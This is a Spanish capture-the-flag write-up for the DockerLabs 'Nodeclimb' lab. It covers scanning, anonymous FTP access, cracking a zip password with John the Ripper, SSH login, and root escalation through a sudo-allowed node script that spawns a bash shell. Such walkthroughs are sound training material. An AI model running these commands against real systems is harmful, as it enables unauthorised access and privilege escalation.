---
title: "DockerLabs - Nodeclimb"
difficulty: "Fácil"
source: "DockerLabs"
---

Nodeclimb es una máquina específica para practicar el acceso FTP anónimo, la explotación de Node.js y la escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh nodeclimb.tar
```

## Reconocimiento

Lanzamos un escaneo de red para visualizar los puertos abiertos:

```bash
nmap -sV -p- 172.17.0.2
```

Encontramos los puertos 21 y 22 (FTP y SSH). Probamos un login anónimo en FTP:

```bash
sudo nmap -sV -sF -p- 172.17.0.3 -O --script=ftp-anon.nse
```

Esto muestra un fichero `.zip` descargable como usuario `anonymous`:

```bash
ftp 172.17.0.3
# usuario: anonymous / contraseña: anonymous
```

## Explotación

Éxito, tenemos acceso. Descargamos el fichero:

```bash
get secretitopicaron.zip
```

O con `wget`:

```bash
wget ftp://anonymous:@172.17.0.3/secretitopicaron.zip
```

El zip está protegido por contraseña. Para crackearlo usamos John the Ripper:

```bash
zip2john secretitopicaron.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt
```

La contraseña es `password1`, con la que extraemos el contenido del zip. Dentro hay un fichero `.txt` con la contraseña de SSH:

```bash
ssh mario@172.17.0.3
```

## Escalada de privilegios

Comprobamos qué podemos ejecutar como sudo:

```bash
sudo -l
```

Podemos ejecutar con `node` un script concreto con privilegios de root. Usamos un script malicioso para obtener acceso como root:

```bash
echo 'require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})' > /home/mario/script.js
sudo /usr/bin/node /home/mario/script.js
```

## Conclusión

Éxito: laboratorio finalizado con acceso a root.
